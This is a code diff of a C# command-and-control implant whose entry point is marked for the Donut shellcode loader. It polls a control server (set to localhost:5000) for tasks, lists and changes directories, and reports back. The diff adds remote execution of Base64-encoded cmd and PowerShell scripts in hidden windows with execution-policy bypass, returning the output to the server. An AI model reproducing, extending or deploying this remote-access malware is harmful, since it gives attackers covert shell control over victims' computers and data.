@@ -3,42 +3,16 @@ using System.IO;
 using System.Net;
 using System.Text;
 using System.Threading;
+using System.Diagnostics;
 
 public class Runner
 {
     // Точка входа для Donut
     public static void Start(string args)
     {
-        // NO THREAD
-        
-        // Все переменные и объекты объявляются локально
         string serverUrl = "http://localhost:5000";
         string clientId = Guid.NewGuid().ToString().Substring(0, 8);
-
-        // Основной цикл работы
         MainLoop(serverUrl, clientId);
-        
-
-        // WITH THREAD (INSTA UNLOADED OR FREEZED WHILE SLEEP)
-        /*
-        Thread beaconThread = new Thread(() =>
-        {
-            try
-            {
-                string serverUrl = "http://localhost:5000";
-                string clientId = Guid.NewGuid().ToString().Substring(0, 8);
-                MainLoop(serverUrl, clientId);
-            }
-            catch { }
-        });
-
-        // CRITICAL: Set to false. 
-        // Foreground threads prevent the .NET runtime from shutting down.
-        beaconThread.IsBackground = false;
-
-        beaconThread.Start();
-        Delay(10000); // Testing: Wait for the thread to do some work before exiting main thread
-        */
     }
 
     private static void MainLoop(string serverUrl, string clientId)
@@ -81,7 +55,6 @@ public class Runner
         }
     }
 
-    // Минимальный HTTP POST
     private static string Transmit(string serverUrl, string path, string json)
     {
         var req = (HttpWebRequest)WebRequest.Create(serverUrl + path);
@@ -96,7 +69,6 @@ public class Runner
             return sr.ReadToEnd();
     }
 
-    // Минимальный HTTP GET
     private static string DownloadString(string url)
     {
         var req = (HttpWebRequest)WebRequest.Create(url);
@@ -106,17 +78,11 @@ public class Runner
             return sr.ReadToEnd();
     }
 
-    // Минимальная задержка без Thread.Sleep
     private static void Delay(int ms)
     {
-        /*
-        var until = DateTime.UtcNow.AddMilliseconds(ms);
-        while (DateTime.UtcNow < until) ;
-        */
         Thread.Sleep(ms);
     }
 
-    // Примитивный парсер JSON
     private static string Extract(string source, string startStr, string endStr)
     {
         try
@@ -139,12 +105,10 @@ public class Runner
                     StringBuilder sb = new StringBuilder("{\"path\":\"" + Path.GetFullPath(target).Replace("\\", "\\\\") + "\",\"entries\":[");
                     string[] dirs = Directory.GetDirectories(target);
                     string[] files = Directory.GetFiles(target);
-
                     foreach (var d in dirs)
                         sb.Append("{\"name\":\"" + Path.GetFileName(d) + "\",\"is_dir\":true},");
                     foreach (var f in files)
                         sb.Append("{\"name\":\"" + Path.GetFileName(f) + "\",\"is_dir\":false,\"size\":" + new FileInfo(f).Length + "},");
-
                     return sb.ToString().TrimEnd(',') + "]}";
 
                 case "cd":
@@ -162,13 +126,80 @@ public class Runner
                 case "ping":
                     return "{\"output\":\"pong\"}";
 
+                case "cmd":
+                    return RunProcess("cmd.exe", args);
+
+                case "powershell":
+                    return RunProcess("powershell.exe", args);
+
                 default:
                     return "{\"error\":\"Unknown command\"}";
             }
         }
         catch (Exception e)
         {
-            return "{\"error\":\"" + e.Message.Replace("\"", "'") + "\"}";
+            return "{\"error\":\"" + e.Message.Replace("\"", "'").Replace("\n", " ").Replace("\r", "") + "\"}";
+        }
+    }
+
+    // Helper for CMD and PowerShell execution
+    private static string RunProcess(string filename, string script)
+    {
+        try
+        {
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = filename;
+
+            // If it's CMD, we wrap the user's command with the UTF-8 switch
+            if (filename.ToLower().Contains("cmd.exe"))
+            {
+                // Microsoft's 'Hidden' Rule: If you wrap the entire argument string in 
+                // an extra set of outer quotes, CMD treats everything inside literally.
+                // Decode CMD args just like PowerShell
+                string cmdScript = Encoding.UTF8.GetString(Convert.FromBase64String(script));
+                psi.Arguments = "/c \"chcp 65001 > nul && " + cmdScript + "\"";
+            }
+            else if (filename.ToLower().Contains("powershell"))
+            {
+                // For PowerShell, we already solved escaping by using Base64.
+                // We just ensure the output stream is UTF8.
+                string decodedScript = Encoding.UTF8.GetString(Convert.FromBase64String(script));
+                psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " + decodedScript + "\"";
+            }
+            else
+            {
+                psi.Arguments = script;
+            }
+
+            psi.RedirectStandardOutput = true;
+            psi.RedirectStandardError = true;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+
+            // We set the C# reader to UTF8 to match the chcp 65001/PS settings
+            psi.StandardOutputEncoding = Encoding.UTF8;
+            psi.StandardErrorEncoding = Encoding.UTF8;
+
+            using (Process p = Process.Start(psi))
+            {
+                string output = p.StandardOutput.ReadToEnd();
+                string error = p.StandardError.ReadToEnd();
+                p.WaitForExit();
+
+                string combined = (output + error).Trim();
+
+                // Critical escaping for JSON
+                combined = combined.Replace("\\", "\\\\")
+                                   .Replace("\"", "\\\"")
+                                   .Replace("\n", "\\n")
+                                   .Replace("\r", "\\r");
+
+                return "{\"output\":\"" + combined + "\"}";
+            }
+        }
+        catch (Exception ex)
+        {
+            return "{\"error\":\"Process error: " + ex.Message.Replace("\"", "'") + "\"}";
         }
     }
 }
